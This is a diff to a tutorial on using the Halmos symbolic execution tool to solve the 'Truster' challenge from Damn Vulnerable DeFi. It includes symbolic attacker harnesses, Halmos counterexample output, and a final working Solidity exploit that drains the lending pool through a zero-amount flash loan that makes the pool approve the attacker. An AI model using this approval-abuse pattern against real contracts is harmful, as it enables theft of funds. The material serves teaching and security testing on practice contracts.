@@ -187,7 +187,7 @@ pragma solidity =0.8.25;
 import "./halmos-cheatcodes/src/SymTest.sol";
 import {Test, console} from "forge-std/Test.sol";
 
-contract GlobalStorage {
+contract GlobalStorage is SymTest {
     // uint256->address mapping to have an ability to iterate over addresses
     mapping (uint256 => address) addresses;
     mapping (address => string) names_by_addr;
@@ -203,16 +203,17 @@ contract GlobalStorage {
 
     /*
     ** It is expected to receive a symbolic address as a parameter
-    ** This function should return some concrete address and its name.
+    ** This function should return some concrete address and corresponding data.
     ** In the case of symbolic execution, the brute force over addresses
     ** is happening here!
     */
     function get_concrete_from_symbolic (address /*symbolic*/ addr) public view 
-                                        returns (address ret, string memory name) 
+                                        returns (address ret, bytes memory data) 
     {
         for (uint256 i = 0; i < addresses_list_size; i++) {
             if (addresses[i] == addr) {
-                return (addresses[i], names_by_addr[addr]);
+                string memory name = names_by_addr[addr];
+                return (addresses[i], svm.createCalldata(name));
             }
         }
         revert(); // Ignore cases when addr is not some concrete known address
@@ -220,7 +221,7 @@ contract GlobalStorage {
 }
 ```
 
-We will not dwell on the implementation details of this contract. I will only say that this is a contract in which you can store address->contract name pairs. And also with its help you can conveniently brute force these pairs symbolically. It is easier to show how to use it in practice. First, let's prepare Global Storage in Truster_Halmos.t.sol:
+We will not dwell on the implementation details of this contract. I will only say that this is a contract in which you can store address->contract name pairs. And also with its help you can conveniently brute force addresses symbolically. It is easier to show how to use it in practice. First, let's prepare Global Storage in Truster_Halmos.t.sol:
 ```solidity
 ...
 import "lib/GlobalStorage.sol";
@@ -243,24 +244,18 @@ contract TrusterChallenge is Test {
 ```
 We will use it in SymbolicAttacker:
 ```solidity
-// SPDX-License-Identifier: MIT
-
-pragma solidity =0.8.25;
-
-import "halmos-cheatcodes/SymTest.sol";
-import "forge-std/Test.sol";
+...
 import "lib/GlobalStorage.sol";
-
+...
 contract SymbolicAttacker is Test, SymTest {
     // We can hardcode this address for convenience
     GlobalStorage glob = GlobalStorage(address(0xaaaa0002)); 
 
 	function attack() public {
         address target = svm.createAddress("target");
-        string memory name;
+        bytes memory data;
         //Get some concrete target-name pair
-        (target, name) = glob.get_concrete_from_symbolic(target);
-        bytes memory data = svm.createCalldata(name);
+        (target, data) = glob.get_concrete_from_symbolic(target);
         target.call(data);
     }
 }
@@ -280,10 +275,9 @@ function flashLoan(uint256 amount, address borrower, address target, bytes calld
 
     token.transfer(borrower, amount);
 
-    string memory name;
-    (target, name) = glob.get_concrete_from_symbolic(target);
-    // Don't use "data". Use "newdata" instead
-    bytes memory newdata = svm.createCalldata(name);
+    // Work with "newdata" like this is the "data"
+    bytes memory newdata;
+    (target, newdata) = glob.get_concrete_from_symbolic(target);
     target.functionCall(newdata);
 
     if (token.balanceOf(address(this)) < balanceBefore) {
@@ -308,13 +302,14 @@ Halmos still can't find a counterexample. But at least now there are no such err
 Finally, we got to the most interesting part. If the problem is not solved in one transaction, we will add another one:
 ```solidity
 contract SymbolicAttacker is Test, SymTest {
-...
+    // We can hardcode this address for convenience
+    GlobalStorage glob = GlobalStorage(address(0xaaaa0002)); 
+
     function execute_tx() private {
         address target = svm.createAddress("target");
-        string memory name;
+        bytes memory data;
         //Get some concrete target-name pair
-        (target, name) = glob.get_concrete_from_symbolic(target);
-        bytes memory data = svm.createCalldata(name);
+        (target, data) = glob.get_concrete_from_symbolic(target);
         target.call(data);
     }
 
@@ -326,14 +321,187 @@ contract SymbolicAttacker is Test, SymTest {
 ```
 Run:
 ```javascript
-
+$ halmos --solver-timeout-assertion 0 --function check_truster
+...
+Running 1 tests for test/truster/Truster_Halmos.t.sol:TrusterChallenge
+[console.log] glob       0x00000000000000000000000000000000000000000000000000000000aaaa0002
+[console.log] token      0x00000000000000000000000000000000000000000000000000000000aaaa0003
+[console.log] pool       0x00000000000000000000000000000000000000000000000000000000aaaa0004
+[console.log] attacker   0x00000000000000000000000000000000000000000000000000000000aaaa0005
+...
+Counterexample:
+halmos_target_address_a04f1b3_01 = 0x00000000000000000000000000000000aaaa0003
+halmos_target_address_bebb031_18 = 0x00000000000000000000000000000000aaaa0003
+p_amount_uint256_9a4d93a_34 = 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
+p_deadline_uint256_ddaa6c9_09 = 0x0000000020000000000000000000000000000000000000000000000000000000
+p_from_address_4e6d758_32 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
+p_owner_address_250ba74_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
+p_r_bytes32_5b6a04f_11 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_s_bytes32_2ebd850_12 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_spender_address_ca49768_07 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
+p_to_address_d90fbcd_33 = 0x00000000000000000000000000000000000000000000000000000000cafe0002
+p_v_uint8_57499b7_10 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_value_uint256_29e8407_08 = 0x0000000000000000000000000000002000000000000002820a0200411081fe82
+...
+Counterexample:
+halmos_target_address_a04f1b3_01 = 0x00000000000000000000000000000000aaaa0004
+halmos_target_address_acee6c4_25 = 0x00000000000000000000000000000000aaaa0003
+p_amount_uint256_47345cb_41 = 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
+p_amount_uint256_eaa2e50_04 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_borrower_address_2411608_05 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_data_length_69a6119_08 = 0x0000000000000000000000000000000000000000000000000000000000000400
+p_deadline_uint256_f555a4e_16 = 0x8000000000000000000000000000000000000000000000000000000000000000
+p_from_address_2e55d34_39 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
+p_owner_address_ede4577_13 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
+p_r_bytes32_a9f3cf2_18 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_s_bytes32_2c3a56d_19 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_spender_address_5bf20a3_14 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
+p_target_address_2ee1188_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
+p_to_address_4b8b987_40 = 0x00000000000000000000000000000000000000000000000000000000cafe0002
+p_v_uint8_3118a03_17 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_value_uint256_7f72094_15 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+...
+Counterexample:
+halmos_target_address_1dec87e_25 = 0x00000000000000000000000000000000aaaa0003
+halmos_target_address_a04f1b3_01 = 0x00000000000000000000000000000000aaaa0004
+p_amount_uint256_afdfdc5_12 = 0x0000000000000000000000000000000000080000000000000000000000000000
+p_amount_uint256_bda6e88_41 = 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
+p_amount_uint256_eaa2e50_04 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_borrower_address_2411608_05 = 0x00000000000000000000000000000000000000000000000000000000cafe0000
+p_data_length_69a6119_08 = 0x0000000000000000000000000000000000000000000000000000000000000400
+p_from_address_ff90fbc_39 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
+p_spender_address_7a9b22c_11 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
+p_target_address_2ee1188_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
+p_to_address_c01d91b_40 = 0x00000000000000000000000000000000000000000000000000000000cafe0002
+...
+Symbolic test result: 0 passed; 1 failed; time: 1366.30s
 ```
+Symbolic execution of even two attacking transactions is hard work, so it took as much as 23 minutes on my machine. But there is also good news - Halmos did find 3 unique counterexamples. However, it is not yet clear which functions were called. Therefore, we will use the following hint:
+```solidity
+contract GlobalStorage is Test, SymTest {
+...
+function get_concrete_from_symbolic (address /*symbolic*/ addr) public view 
+                                        returns (address ret, bytes memory data) {
+    for (uint256 i = 0; i < addresses_list_size; i++) {
+        if (addresses[i] == addr) {
+            string memory name = names_by_addr[addresses[i]];
+            ret = addresses[i];
+            data = svm.createCalldata(name);
+            bytes4 selector = svm.createBytes4("selector");
+            vm.assume(selector == bytes4(data)); // Now Halmos will show us selectors
+            return (ret, data);
+        }
+    }
+    revert(); // Ignore cases when addr is not some concrete known address
+}
+```
+Now, Halmos shows us that selectors. Let's analyze each counterexample one by one:
+```javascript
+Counterexample:
+halmos_selector_bytes4_1442fb7_18 = permit
+halmos_selector_bytes4_3d82d4e_36 = transferFrom
+halmos_target_address_8f80b6b_19 = 0x00000000000000000000000000000000aaaa0003
+halmos_target_address_b0f3fc8_01 = 0x00000000000000000000000000000000aaaa0003
+p_amount_uint256_3cb746f_35 = 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
+p_deadline_uint256_ab117ab_09 = 0x8000000000000000000000000000000000000000000000000000000000000000
+p_from_address_4dc2648_33 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
+p_owner_address_6d86217_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
+p_r_bytes32_96d075f_11 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_s_bytes32_2eef2b4_12 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_spender_address_d4f0916_07 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
+p_to_address_8272409_34 = 0x00000000000000000000000000000000000000000000000000000000cafe0002
+p_v_uint8_49e43a7_10 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_value_uint256_d5bb651_08 = 0x80000000000000000000000000000000000000000000005000200e0000000000
+```
+Wow, Halmos thinks an attacker can call the **permit** function from **ERC20** https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20Permit-permit-address-address-uint256-uint256-uint8-bytes32 -bytes32-
+with pool's signature, thereby allowing to call **transferFrom**, sending all funds to the recovery account.  The problem is that the attacker does not have a private key from the pool, so he cannot craft such a function call. Obviously, we cannot use symbolic analysis to crack the cryptography of signatures. And the null bytes provided by Halmos for the v, r and s parameters confirm this. Therefore, this is, unfortunately, a fake solution.
+The situation is similar with the second counterexample:
+```javascript
+Counterexample:
+halmos_selector_bytes4_6aa2890_44 = transferFrom
+halmos_selector_bytes4_886db9c_26 = permit
+halmos_selector_bytes4_eaf3f0c_09 = flashLoan
+halmos_target_address_28b9879_27 = 0x00000000000000000000000000000000aaaa0003
+halmos_target_address_b0f3fc8_01 = 0x00000000000000000000000000000000aaaa0004
+p_amount_uint256_540579e_04 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_amount_uint256_68bd5b7_43 = 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
+p_borrower_address_726f579_05 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_data_length_1e22349_08 = 0x0000000000000000000000000000000000000000000000000000000000000400
+p_deadline_uint256_cddf022_17 = 0x1000000000000000000000000000000000000000000000000000000000000000
+p_from_address_228a06d_41 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
+p_owner_address_3062812_14 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
+p_r_bytes32_cfaf057_19 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_s_bytes32_c6f3435_20 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_spender_address_cf5d230_15 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
+p_target_address_de4b479_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
+p_to_address_9bc8f39_42 = 0x00000000000000000000000000000000000000000000000000000000cafe0002
+p_v_uint8_88f0351_18 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_value_uint256_a28c1c2_16 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff 
+```
+Here is the same permit, but this time we entered it from under flashLoan. Interestingly, we noticed here: if you pass the amount to flashLoan as 0, the transaction will still go through, and nothing needs to be returned.
+And only for the third time, finally, Halmos did find a solution to this problem. Although it was spinning nearby :D 
+```javascript
+Counterexample:
+halmos_selector_bytes4_1034b81_26 = approve
+halmos_selector_bytes4_478bb2d_44 = transferFrom
+halmos_selector_bytes4_eaf3f0c_09 = flashLoan
+halmos_target_address_331efb7_27 = 0x00000000000000000000000000000000aaaa0003
+halmos_target_address_b0f3fc8_01 = 0x00000000000000000000000000000000aaaa0004
+p_amount_uint256_0811e0c_13 = 0x0020000000000000000000000000000000000000000000000000000000000000
+p_amount_uint256_20a8ea2_43 = 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000
+p_amount_uint256_540579e_04 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_borrower_address_726f579_05 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
+p_data_length_1e22349_08 = 0x0000000000000000000000000000000000000000000000000000000000000400
+p_from_address_b772801_41 = 0x00000000000000000000000000000000000000000000000000000000aaaa0004
+p_spender_address_429fd9d_12 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
+p_target_address_de4b479_06 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
+p_to_address_50e8baf_42 = 0x00000000000000000000000000000000000000000000000000000000cafe0002 
+```
+Of course, we call flashLoan with the parameter amount=0, force the pool inside flashLoan to call approve all tokens for attacker. And then we just make transferFrom pool to recovery the second transaction.
+## Using a counterexample
+We need these addresses in forge:
+```javascript
+$ forge test -vvv --mp test/truster/Truster.t.sol
+...
+Logs:
+    token          0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b
+    pool           0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264
+    recovery       0x73030B99950fB19C6A813465E58A0BcA5487FBEa
+...
+```
+Attacker:
+```solidity
+pragma solidity =0.8.25;
 
+import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
-
-
-
-
+contract Attacker {
+    function attack() public {
+        DamnValuableToken token = DamnValuableToken(address(0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b));
+        TrusterLenderPool pool = TrusterLenderPool(address(0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264));
+        address recovery = address(0x73030B99950fB19C6A813465E58A0BcA5487FBEa);
+        pool.flashLoan(0, address(this), address(token), 
+                            abi.encodeWithSignature("approve(address,uint256)", 
+                            address(this), 
+                            0x0020000000000000000000000000000000000000000000000000000000000000));
+        token.transferFrom(address(pool), recovery, 0x00000000000000000000000000000000000000000000d3c21bcecceda1000000);
+    }
+} 
+```
+Run:
+```javascript
+$ forge test -vvv --mp test/truster/Truster.t.sol
+...
+Logs:
+    token          0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b
+    pool           0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264
+    recovery       0x73030B99950fB19C6A813465E58A0BcA5487FBEa
+...
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.24ms (386.40µs CPU time)
+...
+```
+Passed! Halmos successfully solved this problem as well.
 ```javascript
 
 
